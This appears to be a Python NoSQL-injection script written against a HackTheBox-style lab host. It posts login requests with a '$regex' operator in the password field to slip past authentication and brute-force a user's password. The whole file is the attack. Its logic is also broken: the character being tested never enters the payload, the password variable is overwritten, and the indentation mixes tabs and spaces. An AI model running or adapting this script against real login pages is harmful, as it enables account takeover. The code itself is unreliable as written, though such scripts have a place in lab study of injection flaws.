import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='mango'
password=''
u='http://staging-order.mango.htb/'
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      for password in range(100):
          payload='username=%s&password[$regex]=m.{12}&login=login' % (username)
          r = requests.post(u, data=payload,headers=headers,verify=False, allow_redirects=False)
          if 'Yeah' in r.text or 'OK' in r.text or r.status_code == 302:
             print("Found one more char : %s + Found Length with" % (c))
	     print(r.text)
#             password += c
